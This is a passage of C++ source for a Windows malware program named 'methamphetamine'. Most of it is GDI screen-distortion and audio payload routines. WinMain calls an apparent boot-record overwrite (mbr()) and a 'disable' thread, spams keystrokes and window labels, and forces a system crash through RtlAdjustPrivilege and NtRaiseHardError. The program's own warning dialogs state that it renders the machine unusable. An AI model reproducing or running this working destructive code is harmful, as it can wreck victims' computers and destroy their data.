	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = ws;
	bmpi.bmiHeader.biHeight = hs;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HBITMAP hbit = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(mdc, hbit);
	INT i = 0;
	SetStretchBltMode(hdc, 3);
	SetStretchBltMode(mdc, 3);
	while (true) {
		hdc = GetDC(0);
		StretchBlt(mdc, 0, 0, ws, hs, hdc, 0, 0, w, h, SRCCOPY);
		int color = rand() % 360;
		for (int x = 0; x < ws; x++) {
			for (int y = 0; y < hs; y++) {
				int index = y * ws + x;
				HSV hsv = Colors::RGBtoHSV(rgbquad[index]);
				hsv.h = fmod(color, 360.0);
				rgbquad[index] = Colors::HSVtoRGB(hsv);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, mdc, 0, 0, ws, hs, SRCCOPY);
		StretchBlt(hdc, 0, 0, w, h, hdc, 0, 0, w, h, PATINVERT);
		ReleaseDC(0, hdc);
		if (rand() % 10 == 5) InvalidateRect(0, 0, 0);
	}
	return 0x00;
}

DWORD WINAPI blur(LPVOID lpvd) {
	HDC hdc = GetDC(NULL);
	HDC mdc = CreateCompatibleDC(hdc);
	HBITMAP hbit = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(mdc, hbit);
	BLENDFUNCTION blur = { 0 };
	blur.BlendOp = AC_SRC_OVER;
	blur.BlendFlags = 0;
	blur.AlphaFormat = 0;
	blur.SourceConstantAlpha = 10;
	while (true) {
		hdc = GetDC(NULL);
		StretchBlt(mdc, rand() % 10, rand() % 10, w, h, hdc, rand() % -10, rand() % -10, w, h, SRCCOPY);
		AlphaBlend(hdc, 0, 0, w, h, mdc, 0, 0, w, h, blur);
		ReleaseDC(0, hdc);
		if (rand() % 10 == 5) InvalidateRect(0, 0, 0);
	}
	return 0x00;
}

DWORD WINAPI bitclr(LPVOID lpvd) {
	HDC hdc = GetDC(NULL);
	HDC mdc = CreateCompatibleDC(hdc);
	int ws = w / 4, hs = h / 4;
	BITMAPINFO bmpi = { 0 };
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = ws;
	bmpi.bmiHeader.biHeight = hs;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HBITMAP hbit = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(mdc, hbit);
	SetStretchBltMode(hdc, 3);
	SetStretchBltMode(mdc, 3);
	int color = 0;
	bool statementA = true;
	bool statementB = true;
	while (true) {
		hdc = GetDC(NULL);
		StretchBlt(mdc, 0, 0, ws, hs, hdc, 0, 0, w, h, SRCCOPY);
		int r = rand() % 255;
		int g = rand() % 255;
		int b = rand() % 255;
		for (int x = 0; x < ws; x++) {
			for (int y = 0; y < hs; y++) {
				int index = y * ws + x;
				int noise = rand() % 255;
				noise %= (r * g * b + 1) % (color + 1) + 1;
				rgbquad[index].rgbRed += noise + r;
				rgbquad[index].rgbGreen += noise + g;
				rgbquad[index].rgbBlue += noise + b;
			}
		}
		if (statementA) {
			color++;
			if (color > 170) {
				statementA = 0;
				statementB = 1;
			}
		}
		if (statementB) {
			color--;
			if (color == 0) {
				statementA = 1;
				statementB = 0;
			}
		}
		StretchBlt(hdc, 0, 0, w, h, mdc, 0, 0, ws, hs, SRCCOPY);
		ReleaseDC(0, hdc);
		if (rand() % 10 == 5) InvalidateRect(0, 0, 0);
	}
	return 0x00;
}

DWORD WINAPI strips(LPVOID lpvd) {
	HDC hdc = GetDC(NULL);
	HDC mdc = CreateCompatibleDC(hdc);
	HBITMAP hbit = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(mdc, hbit);
	INT x = 0, y = 0;
	while (true) {
		hdc = GetDC(NULL);
		int dx0 = rand() % 20, dx1 = x;
		int dy0 = y, dy1 = rand() % 20;
		int size = 20;
		if (rand() % 2 == 0) BitBlt(hdc, -dx0, dy0, w, size, hdc, dx0, dy0, !(rand() % 2) ? SRCAND : SRCPAINT);
		if (rand() % 2 == 0) BitBlt(hdc, dx0, dy0, w, size, hdc, -dx0, dy0, !(rand() % 2) ? SRCAND : SRCPAINT);
		if (rand() % 2 == 0) BitBlt(hdc, dx1, dy1, size, h, hdc, dx1, -dy1, !(rand() % 2) ? SRCAND : SRCPAINT);
		if (rand() % 2 == 0) BitBlt(hdc, dx1, -dy1, size, h, hdc, dx1, dy1, !(rand() % 2) ? SRCAND : SRCPAINT);
		x += size; y += size;
		if (x > w) {
			x = 0;
			if (rand() % 10 == 5) InvalidateRect(0, 0, 0);
		}
		if (y > h) {
			y = 0;
		}
		ReleaseDC(0, hdc);
	}
	return 0x00;
}

DWORD WINAPI kaleidoscope(LPVOID lpvd) {
	HDC hdc = GetDC(NULL);
	HDC mdc = CreateCompatibleDC(hdc);
	BITMAPINFO bmpi = { 0 };
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HBITMAP hbit = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(mdc, hbit);
	bool statementA = 1;
	bool statementB = 0;
	int scrollX, scrollY;
	int cw = w / 2, ch = h / 2;
	int i = 0;
	while (true) {
		hdc = GetDC(NULL);
		StretchBlt(mdc, 0, 0, w, h, hdc, w, 0, -cw, h, SRCCOPY);
		StretchBlt(hdc, 0, 0, cw, h, mdc, 0, 0, w, h, SRCCOPY);
		if (rand() % 10 == 5) InvalidateRect(0, 0, 0);
		StretchBlt(mdc, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				int dx = 10;
				if (statementA) {
					scrollX = (x + dx) % w;
					scrollY = (y + dx) % h;
				}
				else if (statementB) {
					scrollX = (x + dx) % w;
					scrollY = abs(y - dx) % h;
				}
				int srcIndex = scrollY * w + scrollX;
				rgbquad[index] = rgbquad[srcIndex];
			}
		}
		if (statementA) {
			i++;
			if (i > 25) {
				statementA = 0;
				statementB = 1;
				if (rand() % 10 == 5) InvalidateRect(0, 0, 0);
			}
		}
		else if (statementB) {
			i--;
			if (i < 0) {
				statementA = 1;
				statementB = 1;
				if (rand() % 10 == 5) InvalidateRect(0, 0, 0);
			}
		}
		StretchBlt(hdc, 0, 0, w, h, mdc, 0, 0, w, h, SRCCOPY);
		StretchBlt(mdc, 0, 0, w, h, hdc, 0, 0, w, ch, SRCCOPY);
		StretchBlt(hdc, 0, ch, w, ch, mdc, 0, h, w, -h, SRCCOPY);
		ReleaseDC(0, hdc);
	}
	return 0x00;
}

DWORD WINAPI palette(LPVOID lpvd) {
	HDC hdc = GetDC(NULL);
	for (int x = 0; x < w; x++) {
		for (int y = 0; y < h; y++) {
			hdc = GetDC(NULL);
			LOGBRUSH logbsh = { BS_SOLID, RGB(rand() % 255, rand() % 255, rand() % 255) };
			HBRUSH hbsh = CreateBrushIndirect(&logbsh);
			SelectObject(hdc, hbsh);
			PatBlt(hdc, 0, 0, w, h, PATINVERT);
			int randx = rand() % w;
			int randy = rand() % h;
			Ellipse(hdc, randx - 30, randy - 30, randx + 30, randy + 30);
			DeleteObject(hbsh);
			Sleep(10);
			ReleaseDC(0, hdc);
		}
	}
	return 0x00;
}

DWORD WINAPI final(LPVOID lpvd) {
	HDC hdc = GetDC(NULL);
	HDC mdc = CreateCompatibleDC(hdc);
	int ws = w / 4, hs = h / 4;
	BITMAPINFO bmpi = { 0 };
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HBITMAP hbit = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(mdc, hbit);
	int color = 0;
	bool statementA = 1;
	bool statementB = 1;
	while (true) {
		hdc = GetDC(0);
		SetStretchBltMode(hdc, 3);
		SetStretchBltMode(mdc, 3);
		StretchBlt(mdc, 0, 0, ws, hs, hdc, 0, h, w, 0, SRCCOPY);
		int r = rand() % 255;
		int g = rand() % 255;
		int b = rand() % 255;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				int noise = rand() % 255;
				noise %= (r * g * b + 1) % (color + 1) + 1;
				rgbquad[index].rgbRed = noise + r;
				rgbquad[index].rgbGreen = noise + g;
				rgbquad[index].rgbBlue = noise + b;
			}
		}
		if (statementA) {
			color++;
			if (color > 170) {
				statementA = 0;
				statementB = 1;
			}
		}
		if (statementB) {
			color--;
			if (color == 0) {
				statementA = 1;
				statementB = 0;
			}
		}
		StretchBlt(hdc, 0, 0, w, h, mdc, 0, 0, ws, hs, SRCCOPY);
		ReleaseDC(0, hdc);
	}
	return 0x00;
}

VOID WINAPI alpha() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 30] = {};
	DWORD c = 0, e = 0;
	float volume = 0.0, dx = 0.6;
	for (DWORD t = 0; t < sizeof(buffer); ++t) {
		if (c == 35000) {
			c = 0; e++; dx += 0.1;
			if (dx > 0.7) dx = 0.5;
			if (e % 10 && volume != 3) {
				volume += 0.1;
			}
		}
		DWORD d = c * dx;
		DWORD freq = d % 30;
		DWORD sound = c & freq % 500;
		buffer[t] = sound * volume;
		c++;
	}
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI beta() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)	{
		DWORD d = (t & 1) * 4;
		DWORD freq = (d | d << 2) >> 100;
		DWORD sound = t | (freq | t) % 500;
		buffer[t] = sound * 0.5;
	}
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI gamma() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t) {
		DWORD freq = Math::SineWave(10, t % 1000, 1, 1000);
		buffer[t] = t ^ (freq % 5);
	}
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI soundA() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t) {
		DWORD wave = Math::SineWave(1, t, 1, wfx.nSamplesPerSec);
		DWORD freq = ((wave | t) * 1000);
		buffer[t] = t | (freq | t) % 500;
	}
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI soundC() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t) {
		DWORD c = t * 4;
		DWORD freq = (c | c << 2) >> 100;
		buffer[t] = t | (freq | t) % 500;
	}
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI soundB() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 30] = {};
	DWORD c = 0, e = 0;
	float d = 4.9;
	BOOL statementA = 1;
	BOOL statementB = 0;
	BOOL statementC = 0;
	for (DWORD t = 0; t < sizeof(buffer); ++t) {
		if (statementA && c == 10000) {
			c = 0; d -= 0.1;
			if (d <= 4.0) {
				d = 4.9; e++;
				if (e == 2) {
					statementA = 0;
					statementB = 1;
					d = 3.2; e = 0;
				}
			}
		}
		if (statementB && c == 10000) {
			c = 0; d += 0.1;
			if (d >= 3.9) {
				d = 3.2; e++;
				if (e == 2) {
					statementB = 0;
					statementC = 1;
					d = 3.8; e = 0;
				}
			}
		}
		if (statementC && c == 10000) {
			c = 0; d -= 0.1;
			if (d <= 3.1) {
				d = 3.9; e++;
				if (e == 2) {
					statementC = 0;
					statementA = 1;
					d = 4.9; e = 0;
				}
			}
		}
		int dx = c * d;
		int freq = dx % 500;
		double sound = c | freq % 100000;
		buffer[t] = sound;
		c++;
	}
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI noise() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 30] = {};
	DWORD c = 0;
	for (DWORD t = 0; t < sizeof(buffer); t++) {
		if (c == 100000) {
			c = 0;
		}
		DWORD freq = (rand() % (c + 1)) % (c + 1);
		buffer[t] = c ^ freq % 500;
		c++;
	}
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI exponential() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 30] = {};
	DWORD c = 0;
	for (DWORD t = 0; t < sizeof(buffer); t++) {
		double wave = Math::SineWave(1, c * 0.0011, (c & 32767), wfx.nSamplesPerSec * 2);
		buffer[t] = (int(wave * 10) & 65535);
		c++;
	}
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI decrescendo() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 30] = {};
	DWORD dx = 0, c = 0;
	for (DWORD t = 0; t < sizeof(buffer); t++) {
		if (c == 100000) {
			c = 0;
		}
		DWORD offset = c + 17000;
		double freq = (8 * sizeof(buffer)) / offset;
		buffer[t] = Math::SineWave(freq, 2, offset, 4000);
		buffer[t] *= 3;
		c++;
	}
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
	DWORD counter = 44000;
	DWORD d = 0, c = 0;
	BOOL statement = 1;
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t) {
		if (c == counter) {
			if (statement) {
				d++;
				if (d == 10) {
					statement = 0;
				}
			}
			if (!statement) {
				d--;
				if (d == 0) {
					statement = 1;
				}
			}
			if (counter == 500) d = rand() % 10;
			if (counter > 1000) counter -= 1000;
			if (counter <= 1000) counter -= 50;
			if (counter == 0) counter = 500;
			c = 0;
		}
		int freq = c * (3 + ((float)d / (float)10));
		buffer[t] = t | freq % 500;
		c++;
	}
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID PressKey(WORD key, INT time) {
	INPUT pInputs = { 0 };
	pInputs.type = INPUT_KEYBOARD;
	pInputs.ki.wVk = key;
	SendInput(1, (LPINPUT)&pInputs, sizeof(INPUT));
	Sleep(time);
	pInputs.ki.dwFlags = KEYEVENTF_KEYUP;
	SendInput(1, (LPINPUT)&pInputs, sizeof(INPUT));
}

DWORD WINAPI keyboard(LPVOID lpvd) {
	while (true) {
		PressKey(VK_CAPITAL, 1000);
		PressKey(VK_SCROLL, 1000);
	}
	return 0x00;
}

int WINAPI EnumChildProc(HWND hwnd, LONG_PTR lPtr) {
	LPCWSTR lpLabel = L"" + rand() % 512;
	if (GetWindowLongW(hwnd, GWL_STYLE) & WS_VISIBLE)
		SendMessageW(hwnd, WM_SETTEXT, 0, (LONG_PTR)lpLabel);
	return true;
}

DWORD WINAPI labelz(LPVOID pvoid) {
	while (true) {
		HWND hwnd = FindWindowW(NULL, L"" + rand() % 512);
		EnumChildWindows(hwnd, &EnumChildProc, 0);
		Sleep(10);
	}
}

DWORD WINAPI msg(LPVOID lpvd) {
	while (true) {
		MessageBoxW(NULL, L"the end is near!", L"methamphetamine", MB_ICONWARNING);
	}
	return 1;
}

void restart() {
	system("shutdown /r /t 0");
}

int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {
	if (MessageBoxW(NULL, L"The software you just executed is considered malware. This malware will harm your computer and makes it unusable. If you are seeing this message without knowing what you just executed, simply press No and nothing will happen. If you know what this malware does and are using a safe environment to test, press Yes to start it. Do you want to execute this malware, resulting in an unusable machine?", L"methamphetamine", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
		ExitProcess(0);
	} 
	else {
		if (MessageBoxW(NULL, L"This is the last warning! The creator is not responsible for any damage made using this malware! Still execute it?", L"methamphetamine", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
			ExitProcess(0);
		}
		else {
			if (!win7check()) restart();
			Sleep(1000);
			mbr();
			CreateThread(0, 0, disable, 0, 0, 0);
			Sleep(4000);
			CreateThread(0, 0, keyboard, 0, 0, 0);
			CreateThread(0, 0, labelz, 0, 0, 0);
			Sleep(2500);
			HANDLE thread1 = CreateThread(0, 0, initial, 0, 0, 0);
			alpha();
			Sleep(2500);
			HANDLE thread1dot1 = CreateThread(0, 0, shake, 0, 0, 0);
			Sleep(5000);
			HANDLE thread1dot2 = CreateThread(0, 0, colors, 0, 0, 0);
			Sleep(20000);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE thread2 = CreateThread(0, 0, wave, 0, 0, 0);
			beta();
			Sleep(6000);
			HANDLE thread2dot1 = CreateThread(0, 0, textout, 0, 0, 0);
			HANDLE thread2dot2 = CreateThread(0, 0, hell1, 0, 0, 0);
			Sleep(6000);
			HANDLE thread2dot3 = CreateThread(0, 0, warp, 0, 0, 0);
			Sleep(6000);
			HANDLE thread2dot4 = CreateThread(0, 0, blur, 0, 0, 0);
			Sleep(6000);
			HANDLE thread2dot5 = CreateThread(0, 0, bitclr, 0, 0, 0);
			Sleep(6000);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE thread3 = CreateThread(0, 0, overdose, 0, 0, 0);
			gamma();
			Sleep(30000);
			TerminateThread(thread3, 0);
			CloseHandle(thread3);
			TerminateThread(thread1, 0);
			CloseHandle(thread1);
			TerminateThread(thread1dot1, 0);
			CloseHandle(thread1dot1);
			TerminateThread(thread1dot2, 0);
			CloseHandle(thread1dot2);
			TerminateThread(thread2, 0);
			CloseHandle(thread2);
			TerminateThread(thread2dot1, 0);
			CloseHandle(thread2dot1);
			TerminateThread(thread2dot2, 0);
			CloseHandle(thread2dot2);
			TerminateThread(thread2dot3, 0);
			CloseHandle(thread2dot3);
			TerminateThread(thread2dot4, 0);
			CloseHandle(thread2dot4);
			TerminateThread(thread2dot5, 0);
			CloseHandle(thread2dot5);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE thread4 = CreateThread(0, 0, kaleidoscope, 0, 0, 0);
			HANDLE thread4dot1 = CreateThread(0, 0, bitclr, 0, 0, 0);
			HANDLE thread4dot2 = CreateThread(0, 0, palette, 0, 0, 0);
			soundA();
			Sleep(30000);
			TerminateThread(thread4, 0);
			CloseHandle(thread4);
			TerminateThread(thread4dot1, 0);
			CloseHandle(thread4dot1);
			TerminateThread(thread4dot2, 0);
			CloseHandle(thread4dot2);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE thread5 = CreateThread(0, 0, freq, 0, 0, 0);
			HANDLE thread5dot1 = CreateThread(0, 0, center, 0, 0, 0);
			HANDLE thread5dot2 = CreateThread(0, 0, tesseract, 0, 0, 0);
			soundB();
			Sleep(30000);
			TerminateThread(thread5, 0);
			CloseHandle(thread5);
			TerminateThread(thread5dot1, 0);
			CloseHandle(thread5dot1);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE thread6 = CreateThread(0, 0, strips, 0, 0, 0);
			HANDLE thread6dot1 = CreateThread(0, 0, colors, 0, 0, 0);
			soundC();
			Sleep(30000);
			TerminateThread(thread6, 0);
			CloseHandle(thread6);
			TerminateThread(thread6dot1, 0);
			CloseHandle(thread6dot1);
			TerminateThread(thread5dot2, 0);
			CloseHandle(thread5dot2);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			shakeIntensity = 10;
			warpIntensity = 20;
			HANDLE thread7 = CreateThread(0, 0, shake, 0, 0, 0);
			sound2();
			Sleep(7500);
			HANDLE thread7dot1 = CreateThread(0, 0, ellipse, 0, 0, 0);
			HANDLE thread7dot2 = CreateThread(0, 0, colors, 0, 0, 0);
			HANDLE thread7dot3 = CreateThread(0, 0, warp, 0, 0, 0);
			Sleep(7500);
			shakeIntensity = 11;
			HANDLE thread7dot4 = CreateThread(0, 0, bitclr, 0, 0, 0);
			Sleep(7500);
			shakeIntensity = 12;
			HANDLE thread7dot5 = CreateThread(0, 0, xorroto, 0, 0, 0);
			Sleep(7500);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			shakeIntensity = 13;
			HANDLE thread8 = CreateThread(0, 0, absroto, 0, 0, 0);
			decrescendo();
			Sleep(30000);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			shakeIntensity = 15;
			random = 0;
			HANDLE thread9 = CreateThread(0, 0, overdose, 0, 0, 0);
			HANDLE thread9dot1 = CreateThread(0, 0, center, 0, 0, 0);
			HANDLE thread9dot2 = CreateThread(0, 0, textout, 0, 0, 0);
			HANDLE thread9dot3 = CreateThread(0, 0, hell1, 0, 0, 0);
			HANDLE thread9dot4 = CreateThread(0, 0, freq, 0, 0, 0);
			HANDLE thread9dot5 = CreateThread(0, 0, hftnxor, 0, 0, 0);
			HANDLE thread9dot6 = CreateThread(0, 0, initial, 0, 0, 0);
			HANDLE thread9dot7 = CreateThread(0, 0, kaleidoscope, 0, 0, 0);
			HANDLE thread9dot8 = CreateThread(0, 0, palette, 0, 0, 0);
			exponential();
			Sleep(30000);
			TerminateThread(thread9, 0);
			CloseHandle(thread9);
			TerminateThread(thread9dot1, 0);
			CloseHandle(thread9dot1);
			TerminateThread(thread9dot2, 0);
			CloseHandle(thread9dot2);
			TerminateThread(thread9dot3, 0);
			CloseHandle(thread9dot3);
			TerminateThread(thread9dot4, 0);
			CloseHandle(thread9dot4);
			TerminateThread(thread9dot5, 0);
			CloseHandle(thread9dot5);
			TerminateThread(thread9dot6, 0);
			CloseHandle(thread9dot6);
			TerminateThread(thread9dot7, 0);
			CloseHandle(thread9dot7);
			TerminateThread(thread9dot8, 0);
			CloseHandle(thread9dot8);
			TerminateThread(thread7, 0);
			CloseHandle(thread7);
			TerminateThread(thread7dot1, 0);
			CloseHandle(thread7dot1);
			TerminateThread(thread7dot2, 0);
			CloseHandle(thread7dot2);
			TerminateThread(thread7dot3, 0);
			CloseHandle(thread7dot3);
			TerminateThread(thread7dot4, 0);
			CloseHandle(thread7dot4);
			TerminateThread(thread7dot5, 0);
			CloseHandle(thread7dot5);
			TerminateThread(thread8, 0);
			CloseHandle(thread8);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			CreateThread(0, 0, msg, 0, 0, 0);
			HANDLE thread10 = CreateThread(0, 0, final, 0, 0, 0);
			noise();
			Sleep(30000);
			BOOLEAN bl;
			DWORD response;
			NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
			RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
			RtlAdjustPrivilege(19, 1, 0, &bl);
			NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
			Sleep(-1);
		}
	}
}